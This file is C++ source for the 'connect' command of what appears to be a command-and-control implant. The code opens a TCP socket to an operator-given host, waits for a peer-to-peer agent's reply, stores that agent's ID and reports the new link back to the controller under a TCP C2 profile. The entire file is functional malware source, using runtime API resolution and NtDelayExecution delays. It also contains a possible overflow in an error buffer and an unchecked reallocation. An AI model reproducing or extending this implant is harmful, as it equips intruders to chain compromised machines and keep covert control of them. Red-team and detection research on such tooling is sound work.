#include <common.h>
#include <commands.h>
#include <transport_tcp.h>
#include <package.h>
#include <parser.h>
#include <config.h>
#include <strings.h>
#include <base64.h>

#ifdef INCLUDE_CMD_CONNECT

using namespace stardust;
using namespace starburst;

auto declfn starburst::cmd_connect(
    _Inout_ instance& inst,
    _In_    char*     task_uuid,
    _In_    Parser*   params
) -> void {
    uint32_t host_len = 0;
    auto hostname = parser_string( params, &host_len );

    uint32_t port = parser_int32( params );

    if ( !hostname || host_len == 0 ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "missing hostname" ) ) );
        return;
    }

    if ( port == 0 || port > 65535 ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "invalid port" ) ) );
        return;
    }

    auto ts = static_cast<TcpLinkState*>( inst.tcp_link_state );
    if ( !ts ) {
        ts = static_cast<TcpLinkState*>( inst.heap_alloc( sizeof( TcpLinkState ) ) );
        if ( !ts ) {
            queue_response( inst, task_uuid, RESPONSE_ERROR,
                symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
            return;
        }
        memory::zero( ts, sizeof( TcpLinkState ) );
        inst.tcp_link_state = ts;
    }

    if ( !tcp_resolve_ws2( inst, ts ) ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "failed to resolve ws2_32" ) ) );
        return;
    }

    char host_buf[260] = {};
    uint32_t cp = host_len > 259 ? 259 : host_len;
    memory::copy( host_buf, hostname, cp );
    host_buf[cp] = '\0';

    DBG_PRINT( inst, "tcp_connect: connecting to %s:%d\n", host_buf, port );

    uintptr_t sock = ts->ws.psocket( TCP_AF_INET, TCP_SOCK_STREAM, TCP_IPPROTO_TCP );
    if ( sock == TCP_INVALID_SOCKET ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "socket creation failed" ) ) );
        return;
    }

    tcp_sockaddr_in addr;
    memory::zero( &addr, sizeof( addr ) );
    addr.sin_family = TCP_AF_INET;
    addr.sin_port   = ts->ws.phtons( static_cast<uint16_t>( port ) );
    addr.sin_addr   = ts->ws.pinet_addr( host_buf );

    if ( addr.sin_addr == 0xFFFFFFFF ) {
        ts->ws.pclosesocket( sock );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "invalid address" ) ) );
        return;
    }

    if ( ts->ws.pconnect( sock, &addr, sizeof( addr ) ) == TCP_SOCKET_ERROR ) {
        ts->ws.pclosesocket( sock );
        char err_buf[256] = {};
        str_copy( err_buf, symbol<char*>( const_cast<char*>( "connect failed to " ) ) );
        str_concat( err_buf, host_buf );
        queue_response( inst, task_uuid, RESPONSE_ERROR, err_buf );
        return;
    }

    DBG_PRINT( inst, "tcp_connect: connected to %s:%d\n", host_buf, port );

    auto link = static_cast<instance::TcpLink*>(
        inst.heap_alloc( sizeof( instance::TcpLink ) )
    );
    if ( !link ) {
        ts->ws.pclosesocket( sock );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
        return;
    }

    memory::zero( link, sizeof( instance::TcpLink ) );
    memory::copy( link->task_uuid, task_uuid, 36 );

    link->link_id   = inst.kernel32.GetTickCount() & 0x7FFFFFFF;
    link->socket    = sock;
    link->port      = static_cast<uint16_t>( port );
    link->connected = true;

    link->hostname = static_cast<char*>( inst.heap_alloc( host_len + 1 ) );
    if ( link->hostname ) {
        memory::copy( link->hostname, hostname, host_len );
        link->hostname[host_len] = '\0';
    }

    uint8_t* p2p_data = nullptr;
    uint32_t p2p_len  = 0;

    for ( int attempt = 0; attempt < 300; attempt++ ) {
        if ( tcp_link_recv( inst, ts, sock, &p2p_data, &p2p_len ) ) break;
        LARGE_INTEGER delay;
        delay.QuadPart = -100000LL;
        inst.ntdll.NtDelayExecution( FALSE, &delay );
    }

    if ( !p2p_data || p2p_len == 0 ) {
        ts->ws.pclosesocket( sock );
        if ( link->hostname ) inst.heap_free( link->hostname );
        inst.heap_free( link );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "no response from P2P agent" ) ) );
        return;
    }

    uint32_t decoded_len = 0;
    auto decoded = base64_decode( inst, p2p_data, p2p_len, &decoded_len );
    if ( decoded && decoded_len >= 36 ) {
        link->agent_id = static_cast<char*>( inst.heap_alloc( 37 ) );
        if ( link->agent_id ) {
            memory::copy( link->agent_id, decoded, 36 );
            link->agent_id[36] = '\0';
        }
    }
    if ( decoded ) inst.heap_free( decoded );

    link->next = inst.tcp_links;
    inst.tcp_links = link;

    DBG_PRINT( inst, "tcp_connect: added link_id=%d agent=%s\n",
        link->link_id, link->agent_id ? link->agent_id : "unknown" );

    auto pkg = package_create( inst );
    if ( !pkg ) {
        inst.heap_free( p2p_data );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
        return;
    }

    package_add_byte( inst, pkg, ACTION_LINK_ADD );
    package_add_byte( inst, pkg, C2_PROFILE_TCP );
    package_add_int32( inst, pkg, link->link_id );
    package_add_string( inst, pkg, link->agent_id ? link->agent_id :
        symbol<char*>( const_cast<char*>( "" ) ) );
    package_add_bytes( inst, pkg, p2p_data, p2p_len );

    inst.heap_free( p2p_data );

    uint32_t data_len = 0;
    auto data = package_build( pkg, &data_len );

    uint32_t needed = inst.response_queue.length + 4 + data_len;
    if ( needed > inst.response_queue.capacity ) {
        uint32_t new_cap = inst.response_queue.capacity == 0 ? 1024 : inst.response_queue.capacity;
        while ( new_cap < needed ) new_cap *= 2;
        inst.response_queue.buffer = static_cast<uint8_t*>(
            inst.heap_realloc( inst.response_queue.buffer, new_cap )
        );
        inst.response_queue.capacity = new_cap;
    }

    auto buf = inst.response_queue.buffer + inst.response_queue.length;
    buf[0] = (data_len >> 24) & 0xFF;
    buf[1] = (data_len >> 16) & 0xFF;
    buf[2] = (data_len >> 8)  & 0xFF;
    buf[3] = data_len & 0xFF;
    memory::copy( buf + 4, data, data_len );
    inst.response_queue.length += 4 + data_len;

    package_destroy( inst, pkg );

    char resp_buf[512] = {};
    str_copy( resp_buf, symbol<char*>( const_cast<char*>( "Connected to " ) ) );
    str_concat( resp_buf, host_buf );
    str_concat( resp_buf, symbol<char*>( const_cast<char*>( ":" ) ) );
    char port_str[8] = {};
    int_to_str( port_str, port, 10 );
    str_concat( resp_buf, port_str );
    str_concat( resp_buf, symbol<char*>( const_cast<char*>( "\nAgent: " ) ) );
    str_concat( resp_buf, link->agent_id ? link->agent_id :
        symbol<char*>( const_cast<char*>( "unknown" ) ) );

    queue_response( inst, task_uuid, RESPONSE_SUCCESS, resp_buf );
}

#endif
